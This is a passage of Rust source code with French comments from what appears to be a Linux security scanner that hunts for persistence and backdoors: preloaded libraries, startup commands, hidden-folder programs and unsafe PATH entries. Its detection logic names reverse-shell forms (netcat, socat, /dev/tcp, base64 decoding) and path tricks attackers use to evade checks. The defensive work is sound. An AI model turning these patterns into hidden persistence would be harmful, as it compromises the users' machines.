//! Ce qui se cache : persistance (préchargement, services, démarrage de session, cron), programmes
//! privilégiés hors paquet ou modifiés, PATH piégeable.

#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

use super::designes::{self, Designe};
use super::*;
use crate::machine::temoins;

mod permise;
mod shell;

/// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
    let reste = fichier.strip_prefix("/usr").ok()?;
    ["bin", "sbin", "lib", "lib64"]
        .iter()
        .any(|d| reste.starts_with(d))
        .then(|| Path::new("/").join(reste))
}

/// Paquet donné par « dpkg -S » : « libc6:amd64, libc6-dbg: /chemin » → « libc6:amd64 ». Les lignes
/// « diversion by … » parlent d'un fichier détourné, pas de son propriétaire.
pub(super) fn paquet_dpkg(texte: &str) -> Option<String> {
    texte
        .lines()
        .filter(|l| !l.starts_with("diversion "))
        .find_map(|l| l.split_once(": ")?.0.split(", ").next().map(str::to_string))
}

/// Empreinte SHA-256 enregistrée pour ce fichier dans le mtree d'un paquet pacman (« ./usr/bin/sudo … sha256digest=… »).
pub(super) fn empreinte_mtree(mtree: &str, fichier: &Path) -> Option<String> {
    let debut = format!(".{} ", fichier.display());
    mtree
        .lines()
        .find(|l| l.starts_with(&debut))?
        .split_whitespace()
        .find_map(|c| c.strip_prefix("sha256digest="))
        .map(str::to_string)
}

/// Sortie de dpkg --verify ou rpm -V : le 3e caractère vaut « 5 » quand le contenu (empreinte) a changé.
/// Les autres différences (date, droits) ne prouvent pas un remplacement du programme.
pub(super) fn contenu_modifie(verif: &str, fichier: &Path) -> bool {
    let chemin = fichier.to_string_lossy();
    verif
        .lines()
        .any(|l| l.split_whitespace().last() == Some(&*chemin) && l.chars().nth(2) == Some('5'))
}

/// Dossiers du PATH dangereux : modifiables par tout le monde (sans « sticky bit ») ou relatifs (« . »).
pub(super) fn path_dangereux(path: &str, droits: impl Fn(&str) -> Option<u32>) -> Vec<String> {
    path.split(':')
        .filter(|d| d.is_empty() || !d.starts_with('/') || droits(d).is_some_and(|m| m & 0o002 != 0 && m & 0o1000 == 0))
        .map(|d| {
            if d.is_empty() {
                "(vide = dossier courant)".to_string()
            } else {
                d.to_string()
            }
        })
        .collect()
}

/// Un fichier de démarrage ou de configuration tel qu'il est montré : « ~/… » sous le dossier personnel `maison`, et
/// rendu inoffensif (dans /etc/profile.d ou ~/.config/autostart, le nom est celui qu'a choisi qui a posé le fichier).
pub(super) fn court(p: &Path, maison: &Path) -> String {
    crate::ui::affichable(
        &p.strip_prefix(maison)
            .map_or_else(|_| p.display().to_string(), |r| format!("~/{}", r.display())),
    )
}

/// Ligne de configuration vide ou en commentaire (shell, systemd, .desktop : « # » ; Lua : « -- » ; « ; »).
pub(super) fn commentaire(ligne: &str) -> bool {
    let l = ligne.trim_start();
    l.is_empty() || l.starts_with('#') || l.starts_with("--") || l.starts_with(';') || l.starts_with("//")
}

/// Les blancs que systemd saute avant de chercher un commentaire (WHITESPACE, string-util.h de systemd 262) : ni la
/// tabulation verticale, ni le saut de page, ni les blancs Unicode que retire `trim_start` (re-contrôle 0.95, R-2).
const BLANCS_DE_SYSTEMD: [char; 4] = [' ', '\t', '\n', '\r'];

/// Ligne de commentaire au format de systemd (user.conf, unités, environment.d) : « # » ou « ; » après les seuls
/// `BLANCS_DE_SYSTEMD`. « \x0c# … » n'en est pas une : systemd la lit (R-2).
pub(super) fn commentaire_de_systemd(ligne: &str) -> bool {
    ligne.trim_start_matches(BLANCS_DE_SYSTEMD).starts_with(['#', ';'])
}

/// Dossiers cachés du dossier personnel où vivent normalement des programmes.
pub(super) const DOSSIERS_CACHES_NORMAUX: [&str; 10] = [
    ".local",
    ".config",
    ".cargo",
    ".rustup",
    ".nix-profile",
    ".npm-global",
    ".bun",
    ".deno",
    ".dotnet",
    ".steam",
];

/// Pourquoi cette commande a la forme d'une porte dérobée, ou `None` : shell inversé, téléchargé ou décodé puis passé
/// à un interpréteur, code caché en base64. Une telle ligne n'est jamais déclarable normale, quelle que soit sa
/// syntaxe (`cibles`).
pub(super) fn raison_grave(commande: &str) -> Option<&'static str> {
    // Les mots coupés aussi sur ce qui sépare ou groupe les commandes du shell, comme pour la chasse :
    // « (nc -e /bin/sh … &) » ou « x;nc -e … » cachaient nc dans « (nc » ou « x;nc ». Un programme se compare par
    // son nom de fichier (« /bin/nc »), une option telle quelle.
    let mots_du_shell: Vec<&str> = crate::machine::chasse::mots(commande)
        .into_iter()
        .map(|(m, _)| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    let a = |m: &str| {
        mots_du_shell
            .iter()
            .any(|x| *x == m || crate::machine::chasse::nom_de_fichier(x) == m)
    };
    if commande.contains("/dev/tcp/") || commande.contains("/dev/udp/") {
        return Some(tr!(
            "connexion réseau ouverte par le shell (shell inversé)",
            "network connection opened by the shell (reverse shell)"
        ));
    }
    // « -e », « -c », « --exec », « --sh-exec », aussi collés à leur valeur (« -e/bin/sh », « --exec=… »).
    let donne_un_shell = mots_du_shell.iter().any(|x| {
        ["-e", "-c", "--exec", "--sh-exec", "--lua-exec"].iter().any(|o| {
            x.strip_prefix(o)
                .is_some_and(|r| r.is_empty() || r.starts_with(['=', '/']))
        })
    });
    if (a("nc") || a("ncat") || a("netcat")) && donne_un_shell {
        return Some(tr!(
            "netcat qui donne un shell (shell inversé)",
            "netcat giving a shell (reverse shell)"
        ));
    }
    let minuscules = commande.to_ascii_lowercase();
    if a("socat") && (minuscules.contains("exec:") || minuscules.contains("system:")) {
        return Some(tr!(
            "socat qui donne un shell (shell inversé)",
            "socat giving a shell (reverse shell)"
        ));
    }
    // Téléchargé ou décodé puis passé à un interpréteur : le même jugement que pour les programmes en marche.
    if let Some(motif) = crate::machine::chasse::passe_a_un_shell(commande) {
        return Some(motif.raison);
    }
    if commande.contains("base64 -d") || commande.contains("base64 --decode") {
        return Some(tr!("commande cachée en base64", "command hidden in base64"));
    }
    None
}

/// Pourquoi cette commande lancée automatiquement ressemble à une porte dérobée, ou `None`. `lancement` : la ligne
/// est une commande lancée (service, démarrage de session), pas un fichier de configuration du shell, où « /tmp »
/// apparaît sans rien lancer. Seules des formes précises sont retenues, pour ne pas alerter sur chaque script maison.
pub(super) fn commande_suspecte(commande: &str, lancement: bool) -> Option<&'static str> {
    commande_suspecte_chez(commande, lancement, &[&home()])
}

/// `commande_suspecte`, un dossier caché se jugeant sous chacun des dossiers personnels `maisons` (celui de la
/// session qui lit, celui de la lecture, s'ils diffèrent : une forme finale de systemd y développe « %h »).
fn commande_suspecte_chez(commande: &str, lancement: bool, maisons: &[&str]) -> Option<&'static str> {
    if let Some(raison) = raison_grave(commande) {
        return Some(raison);
    }
    if !lancement {
        return None;
    }
    // Coupée sur tout blanc, Unicode compris : plus de mots jugés, jamais moins (le témoin, lui, refuse un tel blanc).
    let mots: Vec<&str> = commande
        .split_whitespace()
        .map(|m| m.trim_matches(|c| c == '"' || c == '\''))
        .collect();
    // Programme lancé : premier mot, sans les préfixes de systemd (« -/usr/bin/x », « @ », « + », « ! », « !! »,
    // « : », « | » de systemd 262).
    let programme = mots.first()?.trim_start_matches(['-', '@', '+', '!', ':', '|']);
    // Un interpréteur ou un lanceur (« /usr/bin/bash ~/.x/a.sh », « env /tmp/x ») : ce qu'il lit ou lance se juge
    // comme le programme lui-même.
    let mut a_juger = vec![programme];
    if designes::lit_un_script(programme) {
        a_juger.extend(mots.iter().skip(1).copied());
    }
    for p in a_juger {
        for maison in maisons {
            if let Some(raison) = programme_cache(p, maison) {
                return Some(raison);
            }
        }
    }
    None
}

/// Un chemin simplifié comme le lit le noyau, sans suivre de lien : « // » et « /./ » ôtés, « dossier/.. » retiré
/// (« /var/../tmp/x » est « /tmp/x » ; relecture adverse, C2). Un chemin relatif garde son premier mot (« ~ »,
/// « $HOME », « %h »), qu'un « .. » ne retire pas.
fn chemin_simplifie(p: &str) -> String {
    if !p.contains("//") && !p.contains("/.") {
        return p.to_string();
    }
    let absolu = p.starts_with('/');
    let mut morceaux: Vec<&str> = Vec::new();
    for (i, m) in p.split('/').enumerate() {
        if !absolu && i == 0 {
            morceaux.push(m);
            continue;
        }
        match m {
            "" | "." => {}
            ".." if morceaux.len() > usize::from(!absolu) && morceaux.last() != Some(&"..") => {
                morceaux.pop();
            }
            ".." if absolu => {}
            _ => morceaux.push(m),
        }
    }
    let corps = morceaux.join("/");
    if absolu { format!("/{corps}") } else { corps }
}

/// Un programme lancé depuis un dossier temporaire ou un dossier caché du dossier personnel `maison`.
fn programme_cache(programme: &str, maison: &str) -> Option<&'static str> {
    chemin_cache(programme, maison, false)
}

/// Les dossiers cachés du dossier personnel qui gardent des données, pas des programmes : un argument qui y mène
/// (« ssh -F ~/.ssh/config ») n'est pas levé ; un programme qui s'y trouve, si.
const DOSSIERS_DE_DONNEES: [&str; 8] = [
    ".ssh",
    ".gnupg",
    ".mozilla",
    ".thunderbird",
    ".icons",
    ".themes",
    ".fonts",
    ".password-store",
];

/// Le chemin sans « /proc/self/root », « /proc/thread-self/root » ni « /proc/<numéro>/root » en tête : la racine
/// vue par un processus, la même ici (relecture adverse 2, N4).
fn sans_racine_de_proc(p: &str) -> &str {
    let mut p = p;
    while let Some(reste) = p.strip_prefix("/proc/") {
        let Some((qui, apres)) = reste.split_once('/') else {
            break;
        };
        let processus =
            qui == "self" || qui == "thread-self" || (!qui.is_empty() && qui.bytes().all(|b| b.is_ascii_digit()));
        // « /proc/self/task/<n>/root » : la même racine, vue par un fil du processus (vérification 3, P7).
        let apres = match apres.strip_prefix("task/").and_then(|t| t.split_once('/')) {
            Some((fil, reste)) if !fil.is_empty() && fil.bytes().all(|b| b.is_ascii_digit()) => reste,
            _ => apres,
        };
        match apres.strip_prefix("root") {
            Some(r) if processus && (r.is_empty() || r.starts_with('/')) => p = r,
            _ => break,
        }
    }
    p
}

/// Un chemin (programme, ou `argument` d'un programme) dans un dossier temporaire (/tmp, /var/tmp, /dev/shm, le
/// dossier de session /run/user/…), ou dans un dossier caché d'un dossier personnel : `maison`, ou celui d'un autre
/// compte (« `/home/<nom>/` », « `/var/home/<nom>/` », « /root/ ») quand il ne contient pas `maison`.
fn chemin_cache(programme: &str, maison: &str, argument: bool) -> Option<&'static str> {
    let simple = chemin_simplifie(programme);
    let programme = sans_racine_de_proc(&simple);
    if temporaire(programme) {
        return Some(tr!(
            "programme lancé depuis un dossier temporaire",
            "program started from a temporary folder"
        ));
    }
    let relatif = programme
        .strip_prefix("~/")
        .or_else(|| programme.strip_prefix("$HOME/"))
        .or_else(|| programme.strip_prefix("${HOME}/"))
        .or_else(|| programme.strip_prefix("%h/"))
        .or_else(|| {
            (!maison.is_empty())
                .then(|| programme.strip_prefix(&format!("{maison}/")))
                .flatten()
        })
        .or_else(|| maison_d_un_compte(programme, maison));
    if let Some(r) = relatif {
        let premier = r.split('/').next().unwrap_or("");
        if premier.starts_with('.')
            && r.contains('/')
            && !DOSSIERS_CACHES_NORMAUX.contains(&premier)
            && !(argument && DOSSIERS_DE_DONNEES.contains(&premier))
        {
            return Some(tr!(
                "programme rangé dans un dossier caché du dossier personnel",
                "program stored in a hidden folder of the home folder"
            ));
        }
    }
    None
}

/// Un chemin (simplifié) dans un dossier temporaire : /tmp, /var/tmp, /dev/shm, un dossier de session
/// (/run/user/…, qu'efface la fin de la session ; /var/run/user/…, le même), un dossier de verrous ouvert à tous ;
/// ou le dossier courant, un descripteur ou une projection d'un processus (/proc/self/cwd/…, `/proc/<n>/fd/…`) : un
/// fichier qu'on ne voit pas sur le disque (vérification 3, P7).
fn temporaire(p: &str) -> bool {
    const DOSSIERS: [&str; 9] = [
        "/tmp/",
        "/var/tmp/",
        "/dev/shm/",
        "/run/user/",
        "/var/run/user/",
        "/run/lock/",
        "/var/run/lock/",
        "/var/lock/",
        "/dev/mqueue/",
    ];
    DOSSIERS.iter().any(|d| p.starts_with(d)) || vue_d_un_processus(p)
}

/// « `/proc/<self|thread-self|n>/(cwd|fd|map_files)/…` », aussi par « `task/<n>/` ».
fn vue_d_un_processus(p: &str) -> bool {
    let Some((qui, apres)) = p.strip_prefix("/proc/").and_then(|r| r.split_once('/')) else {
        return false;
    };
    let nombre = |x: &str| !x.is_empty() && x.bytes().all(|b| b.is_ascii_digit());
    if !(qui == "self" || qui == "thread-self" || nombre(qui)) {
        return false;
    }
    let apres = match apres.strip_prefix("task/").and_then(|t| t.split_once('/')) {
        Some((fil, reste)) if nombre(fil) => reste,
        _ => apres,
    };
    ["cwd", "fd", "map_files"].iter().any(|d| {
        apres
            .strip_prefix(d)
            .is_some_and(|r| r.is_empty() || r.starts_with('/'))
    })
}

/// `chemin_cache` sous le dossier personnel de `maisons` qui contient le chemin, le plus long (le plus précis : celui
/// de la lecture sous celui de la session), ou sous chacun si aucun ne le contient.
fn chemin_cache_chez(p: &str, maisons: &[&str], argument: bool) -> Option<&'static str> {
    let precise = maisons
        .iter()
        .filter(|m| !m.is_empty() && (p == **m || p.starts_with(&format!("{m}/"))))
        .max_by_key(|m| m.len());
    match precise {
        Some(m) => chemin_cache(p, m, argument),
        None => maisons.iter().find_map(|m| chemin_cache(p, m, argument)),
    }
}

/// Le reste de `p` sous le dossier personnel d'un compte (« `/home/<nom>/` », « `/var/home/<nom>/` », « /root/ ») qui
/// ne contient pas `maison` (celui-là se lit par `maison`, plus précis) : « /home/%u/.x/agent » d'une unité.
fn maison_d_un_compte<'a>(p: &'a str, maison: &str) -> Option<&'a str> {
    let (racine, reste) = if let Some(r) = p.strip_prefix("/root/") {
        ("/root/".to_string(), r)
    } else {
        let base = ["/home/", "/var/home/"].into_iter().find(|b| p.starts_with(b))?;
        let (nom, reste) = p.get(base.len()..)?.split_once('/')?;
        if nom.is_empty() {
            return None;
        }
        (format!("{base}{nom}/"), reste)
    };
    (!format!("{maison}/").starts_with(&racine)).then_some(reste)
}

/// La raison d'une ligne de shell que Vanguard ne coupe pas sûrement.
fn shell_non_lu() -> &'static str {
    tr!(
        "ligne de shell que Vanguard ne lit pas sûrement (variable, joker, « ~nom », guillemet non fermé, boucle ou document en ligne) : ce qu'elle lance n'est pas vérifié",
        "shell line Vanguard cannot read safely (variable, wildcard, “~name”, unclosed quote, loop or here-document): what it starts is not checked"
    )
}

/// La raison d'une variable qui fait charger du code depuis un dossier caché ou temporaire.
fn variable_cachee() -> &'static str {
    tr!(
        "variable qui fait chercher programmes, bibliothèques ou code dans un dossier caché ou temporaire (PATH, BASH_ENV, PYTHONPATH…)",
        "variable that makes programs, libraries or code be looked up in a hidden or temporary folder (PATH, BASH_ENV, PYTHONPATH…)"
    )
}

/// La raison d'une bibliothèque préchargée.
fn prechargee() -> &'static str {
    tr!(
        "bibliothèque préchargée (LD_PRELOAD, LD_AUDIT) dans ce qui se lance",
        "library preloaded (LD_PRELOAD, LD_AUDIT) into what starts"
    )
}

/// Le nom et la valeur d'une affectation « NOM=valeur » (nom du shell), ou `None`.
fn affectation(mot: &str) -> Option<(&str, &str)> {
    let (nom, valeur) = mot.split_once('=')?;
    let mut lettres = nom.chars();
    let premiere = lettres.next()?;
    ((premiere.is_ascii_alphabetic() || premiere == '_') && lettres.all(|c| c.is_ascii_alphanumeric() || c == '_'))
        .then_some((nom, valeur))
}

/// Pourquoi poser `nom` à `valeur` change ce qui se lance, ou `None` : une bibliothèque préchargée (LD_PRELOAD,
/// LD_AUDIT, quelle que soit sa valeur), ou une variable de recherche ou d'injection (PATH, `variable_d_injection`)
/// dont un morceau mène à un dossier caché ou temporaire. Un dossier visible du compte n'est pas levé (modèle de
/// menace).
fn variable_suspecte(nom: &str, valeur: &str, maisons: &[&str]) -> Option<&'static str> {
    let valeur = valeur.trim_matches(|c| c == '"' || c == '\'');
    if ["LD_PRELOAD", "LD_AUDIT"].contains(&nom) {
        return (!valeur.trim().is_empty()).then(prechargee);
    }
    // Une adresse de bus « unixexec: » lance le programme qu'elle nomme à chaque connexion (vérification 3, P11).
    if nom.starts_with("DBUS_") && valeur.contains("unixexec:") {
        return Some(tr!(
            "adresse de bus D-Bus « unixexec: » : chaque programme qui s'y connecte lance le programme qu'elle nomme",
            "D-Bus address “unixexec:”: each program that connects to it starts the program it names"
        ));
    }
    if variable_de_programme(nom) {
        let cache = valeur
            .split(|c: char| c.is_whitespace() || matches!(c, '=' | ':' | '|' | '"' | '\'' | ';'))
            .filter(|m| m.starts_with(['/', '~', '$']))
            .any(|m| chemin_cache_chez(m, maisons, false).is_some());
        return cache.then(variable_cachee);
    }
    if nom != "PATH" && !variable_d_injection(nom) {
        return None;
    }
    let cache = valeur
        .split(|c: char| c == ':' || c == ';' || c == ',' || c.is_whitespace() || c == '=')
        .filter(|m| m.starts_with(['/', '~', '$']))
        .any(|m| {
            let dedans = format!("{}/x", m.trim_end_matches('/'));
            chemin_cache_chez(&dedans, maisons, false).is_some()
        });
    cache.then(variable_cachee)
}

/// Une variable qui nomme un programme que d'autres lancent (mot de passe demandé, éditeur, pager, terminal,
/// navigateur, shell) : sa valeur se lance comme une commande (vérification 3, P11).
fn variable_de_programme(nom: &str) -> bool {
    const NOMS: [&str; 17] = [
        "SSH_ASKPASS",
        "SUDO_ASKPASS",
        "GIT_ASKPASS",
        "GIT_SSH",
        "GIT_SSH_COMMAND",
        "SHELL",
        "EDITOR",
        "VISUAL",
        "PAGER",
        "MANPAGER",
        "GIT_PAGER",
        "GIT_EDITOR",
        "BROWSER",
        "TERMINAL",
        "GAMEMODERUNEXEC",
        "LESSOPEN",
        "LESSCLOSE",
    ];
    NOMS.contains(&nom)
}

/// Les programmes qui en lancent un autre, ou lisent du code, d'après leurs arguments, en plus de
/// `designes::lit_un_script` (relecture adverse 2, N7) : chargeur de bibliothèques, enveloppes de jeux ou de
/// terminal, lanceurs d'Omarchy et de Hyprland, outils dont une option lance une commande.
fn enveloppe(programme: &str) -> bool {
    let nom = crate::machine::chasse::nom_de_fichier(programme);
    nom.starts_with("ld-linux")
        || nom.starts_with("ld-musl")
        || nom.starts_with("omarchy-launch")
        || [
            "ld.so",
            "gamemoderun",
            "prime-run",
            "mangohud",
            "gamescope",
            "xdg-terminal-exec",
            "xdg-open",
            "hyprctl",
            "find",
            "make",
            "vim",
            "nvim",
            "vi",
            "git",
            "ssh",
            "tar",
            "rsync",
            "zip",
            "less",
            "man",
        ]
        .contains(&nom)
}

/// Un shell qui lit une commande par « -c ».
fn shell_qui_lit_c(programme: &str) -> bool {
    [
        "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "yash", "fish", "rbash", "busybox",
    ]
    .contains(&crate::machine::chasse::nom_de_fichier(programme))
}

/// Pourquoi un argument d'un programme mène à un dossier temporaire ou caché, ou `None` : l'argument coupé sur ce qui
/// sépare un chemin d'une option ou d'une autre valeur (« --x=/tmp/.x/a », « -S/tmp/.x/s », « a:b »,
/// « 'os.system(\"/tmp/.x/a\")' »). `caches` : les dossiers cachés comptent aussi (sinon les seuls temporaires).
fn argument_cache(argument: &str, maisons: &[&str], caches: bool) -> Option<&'static str> {
    argument
        .split(|c: char| {
            c.is_whitespace()
                || matches!(
                    c,
                    '=' | ':'
                        | ','
                        | '\''
                        | '"'
                        | '('
                        | ')'
                        | ';'
                        | '`'
                        | '['
                        | ']'
                        | '{'
                        | '}'
                        | '<'
                        | '>'
                        | '|'
                        | '&'
                )
        })
        .filter_map(|m| {
            // « -S/tmp/x » : l'option collée ôtée.
            let debut = m.find(['/', '~', '$'])?;
            let option = m.get(..debut)?;
            (option.is_empty()
                || (option.starts_with('-') && option.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')))
            .then(|| m.get(debut..))
            .flatten()
        })
        .find_map(|m| {
            if !caches && !temporaire(sans_racine_de_proc(&chemin_simplifie(m))) {
                return None;
            }
            chemin_cache_chez(m, maisons, true)
        })
}

/// Les mots-clés du shell qui ouvrent ou ferment un bloc sans rien lancer.
const MOTS_CLES_SHELL: [&str; 11] = [
    "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "!", "{",
];

/// Pourquoi une ligne de shell (ce que Hyprland passe à « /bin/sh -c », un « exec_cmd » Lua, une ligne de cron)
/// ressemble à une porte dérobée, chaque commande simple jugée (relecture adverse 2, N1) ; `Err` si elle ne se lit pas
/// sûrement (`shell::commandes`, ou un programme dont le nom ne se connaît qu'au lancement). `tout_argument` : le
/// fichier s'écrit par le compte ; un argument de n'importe quel programme qui mène à un dossier temporaire se juge.
fn ligne_de_shell_suspecte(ligne: &str, maisons: &[&str], tout_argument: bool) -> Result<Option<&'static str>, ()> {
    ligne_de_shell_a(ligne, maisons, tout_argument, 0)
}

fn ligne_de_shell_a(
    ligne: &str,
    maisons: &[&str],
    tout_argument: bool,
    profondeur: u32,
) -> Result<Option<&'static str>, ()> {
    if profondeur > 8 {
        return Err(());
    }
    if let Some(raison) = raison_grave(ligne) {
        return Ok(Some(raison));
    }
    let mut dossier = Courant::Maison;
    for simple in shell::commandes(ligne)? {
        let raison = simple_suspecte(&simple, &mut dossier, maisons, tout_argument, profondeur)?;
        if raison.is_some() {
            return Ok(raison);
        }
    }
    Ok(None)
}

/// Le dossier courant d'une ligne de shell, que « cd » change : le dossier personnel tant qu'aucun « cd », un
/// chemin écrit, ou inconnu (un « cd » qui ne se lit pas sûrement).
enum Courant {
    Maison,
    Connu(String),
    Inconnu,
}

/// Une commande simple d'une ligne de shell (`ligne_de_shell_suspecte`), ou d'une unité une fois coupée par systemd.
fn simple_suspecte(
    simple: &shell::Simple,
    dossier: &mut Courant,
    maisons: &[&str],
    tout_argument: bool,
    profondeur: u32,
) -> Result<Option<&'static str>, ()> {
    use shell::Flou;
    let mut k = 0_usize;
    while let Some(m) = simple.mots.get(k) {
        if m.flou == Flou::Aucun && MOTS_CLES_SHELL.contains(&m.texte.as_str()) {
            k = k.saturating_add(1);
            continue;
        }
        if let Some((nom, valeur)) = affectation(&m.texte) {
            if let Some(raison) = variable_suspecte(nom, valeur, maisons) {
                return Ok(Some(raison));
            }
            if m.flou != Flou::Aucun && (nom == "PATH" || variable_d_injection(nom)) {
                return Err(());
            }
            k = k.saturating_add(1);
            continue;
        }
        break;
    }
    let mots = simple.mots.get(k..).unwrap_or_default();
    let Some(premier) = mots.first() else {
        return Ok(None);
    };
    if premier.flou != Flou::Aucun {
        return Err(());
    }
    let nom = premier.texte.as_str();
    if ["for", "case", "select", "function", "coproc"].contains(&nom) || nom.ends_with("()") {
        return Err(());
    }
    if nom == "cd" || nom == "pushd" {
        *dossier = match mots.get(1) {
            None => Courant::Connu("~".to_string()),
            Some(d) if d.flou == Flou::Aucun && (d.texte.starts_with(['/', '~']) || d.texte.starts_with("$HOME")) => {
                Courant::Connu(d.texte.clone())
            }
            Some(d) if d.flou == Flou::Aucun && !d.texte.starts_with('-') => match dossier {
                Courant::Connu(ici) => Courant::Connu(format!("{ici}/{}", d.texte)),
                Courant::Inconnu => Courant::Inconnu,
                Courant::Maison => Courant::Connu(format!("~/{}", d.texte)),
            },
            Some(_) => Courant::Inconnu,
        };
        return Ok(None);
    }
    // Un programme nommé par un chemin relatif se cherche dans le dossier courant.
    let programme = if nom.contains('/') && !nom.starts_with(['/', '~']) && !nom.starts_with("$HOME") {
        match dossier {
            Courant::Connu(ici) => format!("{ici}/{nom}"),
            Courant::Inconnu => return Err(()),
            Courant::Maison => format!("~/{nom}"),
        }
    } else {
        nom.to_string()
    };
    if let Some(raison) = chemin_cache_chez(&programme, maisons, false) {
        return Ok(Some(raison));
    }
    let lanceur = designes::lit_un_script(&programme) || enveloppe(&programme);
    let arguments = mots.get(1..).unwrap_or_default();
    for (i, a) in arguments.iter().enumerate() {
        if lanceur && a.flou != Flou::Aucun {
            return Err(());
        }
        if a.flou != Flou::Aucun {
            continue;
        }
        if lanceur
            && let Some((n, v)) = affectation(&a.texte)
            && let Some(raison) = variable_suspecte(n, v, maisons)
        {
            return Ok(Some(raison));
        }
        if (lanceur || tout_argument)
            && let Some(raison) = argument_cache(&a.texte, maisons, lanceur)
        {
            return Ok(Some(raison));
        }
        // « sh -c ligne », « bash -lc ligne », « sh -c/tmp/x » : la ligne lue comme une ligne de shell.
        // Le mot avant ses options : le shell qui lit « -c » (« kitty -e bash -l -c … »).
        let shell = std::iter::once(premier)
            .chain(arguments.get(..i).unwrap_or_default())
            .rev()
            .find(|p| !p.texte.starts_with('-'))
            .is_some_and(|p| shell_qui_lit_c(&p.texte));
        if let Some(c) = a.texte.strip_prefix('-')
            && shell
            && !c.starts_with('-')
            && let Some(position) = c.find('c')
        {
            let colle = c.get(position.saturating_add(1)..).unwrap_or_default();
            let a_lire = if colle.is_empty() {
                arguments.get(i.saturating_add(1)).map(|m| m.texte.clone())
            } else {
                Some(colle.to_string())
            };
            if let Some(l) = a_lire {
                let r = ligne_de_shell_a(&l, maisons, tout_argument, profondeur.saturating_add(1))?;
                if r.is_some() {
                    return Ok(r);
                }
            }
        }
    }
    // « hyprctl dispatch exec … » : la commande que Hyprland lancera, lue comme une ligne de shell.
    if crate::machine::chasse::nom_de_fichier(&programme) == "hyprctl"
        && let Some(p) = arguments.iter().position(|a| a.texte == "dispatch")
        && arguments.get(p.saturating_add(1)).is_some_and(|a| a.texte == "exec")
    {
        let reste: Vec<&str> = arguments
            .get(p.saturating_add(2)..)
            .unwrap_or_default()
            .iter()
            .map(|a| a.texte.as_str())
            .collect();
        let reste = reste.join(" ");
        let sans_regles = match reste.strip_prefix('[') {
            Some(r) => r.split_once(']').map_or("", |(_, c)| c),
            None => &reste,
        };
        let r = ligne_de_shell_a(sans_regles, maisons, tout_argument, profondeur.saturating_add(1))?;
        if r.is_some() {
            return Ok(r);
        }
    }
    // Une entrée redirigée vers un interpréteur (« sh </tmp/.x/s ») est son script.
    if lanceur {
        for e in &simple.entrees {
            if e.flou != Flou::Aucun {
                return Err(());
            }
            if let Some(raison) = argument_cache(&e.texte, maisons, true) {
                return Ok(Some(raison));
            }
        }
    }
    Ok(None)
}

/// Commande lancée par une ligne de démarrage : « ExecStart=… » (systemd), « Exec=… » (.desktop),
/// « exec-once = … » (Hyprland), « o.exec_on_start("…") » (Omarchy en Lua). `None` si la ligne ne lance rien.
pub(super) fn commande_lancee(ligne: &str) -> Option<String> {
    commande_lancee_lue(ligne).map(|(c, _)| c)
}

/// `commande_lancee`, et si elle est ambiguë : une ligne Lua où du texte suit le dernier guillemet, ou dont la
/// commande garde un guillemet (« o.exec_on_start("/x/run" .. suffixe) » lance autre chose que « /x/run »). Jugée
/// quand même ; seul le choix « normal » la refuse.
fn commande_lancee_lue(ligne: &str) -> Option<(String, bool)> {
    let l = ligne.trim();
    if commentaire(l) {
        return None;
    }
    if let Some((cle, valeur)) = l.split_once('=') {
        let cle = cle.trim();
        if cle.starts_with("Exec") || ["exec-once", "exec", "execr", "execr-once", "exec-shutdown"].contains(&cle) {
            return Some((valeur.trim().to_string(), false));
        }
    }
    if ["exec_on_start", "launch_on_start", "exec_once", "exec-once"]
        .iter()
        .any(|m| l.contains(m))
    {
        let debut = l.find(['"', '\''])?;
        let fin = l.rfind(['"', '\''])?;
        // `get` rend `None` quand la fin précède le début : le même cas que `fin > debut` refusait.
        let dedans = l.get(debut.checked_add(1)?..fin)?;
        let apres = l.get(fin.checked_add(1)?..).unwrap_or_default();
        // Avant le premier guillemet, seul le nom de l'appel et sa parenthèse : « f(x .. "/y") » lance autre chose
        // que « /y » (relecture adverse, M3).
        let avant = l.get(..debut).unwrap_or_default().trim_end_matches([' ', '\t']);
        let ambigue = dedans.contains(['"', '\''])
            || apres.contains(|c: char| !matches!(c, ')' | ',' | ';' | ' ' | '\t'))
            || !avant.ends_with('(');
        return Some((dedans.to_string(), ambigue));
    }
    None
}

/// Ligne qui précharge une bibliothèque dans tous les programmes (LD_PRELOAD, LD_AUDIT) ; un « unset » seul
/// (`unset_seul`) la retire.
pub(super) fn definit_prechargement(ligne: &str) -> bool {
    !commentaire(ligne) && nomme_prechargement(ligne) && !unset_seul(ligne)
}

/// Une ligne qui ne fait que retirer des variables : « unset », puis des noms ou des options, rien d'autre.
/// « unset A; export LD_PRELOAD=… » ou « unset A && … » n'en est pas une (re-contrôle 0.95, R-3).
fn unset_seul(ligne: &str) -> bool {
    ligne
        .trim_start_matches([' ', '\t'])
        .trim_end_matches([' ', '\t', '\r'])
        .strip_prefix("unset")
        .is_some_and(|reste| {
            (reste.is_empty() || reste.starts_with([' ', '\t']))
                && reste
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | ' ' | '\t'))
        })
}

/// Ligne de commentaire pour un shell (sh, bash, zsh, fish, csh ; uwsm source ses fichiers par sh) : vide, ou « # »
/// au premier mot, après des espaces ou des tabulations seulement. Ni « -- », ni « // », ni « ; », ni « # » après une
/// tabulation verticale ou une espace insécable : le shell y lit une commande, et ce qui suit « ; » s'exécute
/// (re-contrôle 0.95, R-3, mesuré avec sh et bash 5.3).
fn commentaire_du_shell(ligne: &str) -> bool {
    let l = ligne.trim_start_matches([' ', '\t']);
    l.is_empty() || l.starts_with('#')
}

/// Ligne de commentaire selon le lecteur du fichier : systemd (`commentaire_de_systemd`), un shell
/// (`commentaire_du_shell`), Hyprland (`commentaire`). Une règle par format (R-3).
fn commentaire_selon(ligne: &str, sorte: Variables) -> bool {
    match sorte {
        Variables::Cles | Variables::Systemd => commentaire_de_systemd(ligne),
        Variables::Shell => commentaire_du_shell(ligne),
        Variables::Hypr => commentaire(ligne),
    }
}

/// Ligne qui précharge (LD_PRELOAD, LD_AUDIT) selon le lecteur du fichier : hors de ses commentaires
/// (`commentaire_selon`) ; « unset » seul n'en retire que dans un shell ou Hyprland, pas au format de systemd où ce
/// n'est qu'un mot (R-2).
